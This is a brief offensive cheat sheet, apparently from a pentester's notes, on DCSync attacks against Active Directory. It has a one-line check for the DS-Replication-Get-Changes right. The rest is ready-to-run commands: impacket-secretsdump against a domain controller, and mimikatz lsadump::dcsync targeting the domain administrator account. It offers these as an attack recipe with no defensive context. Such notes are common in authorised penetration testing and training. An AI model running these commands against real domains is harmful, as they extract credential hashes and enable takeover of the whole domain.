---
tags:
  - Authenticated
  - DS-Replication-Get-Changes
  - AD
---
## Identify
---
Do you control and object with the `DS-Replication-Get-Changes` ACL?
## Exploit
---
```Python
impacket-secretsdump 'domain.local'/'<user>':'<pass>'@'<DC0IP>'
```
**From windows**
```Bash
runas /netonly /user:DOMAIN\user powershell
```
```Bash
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
```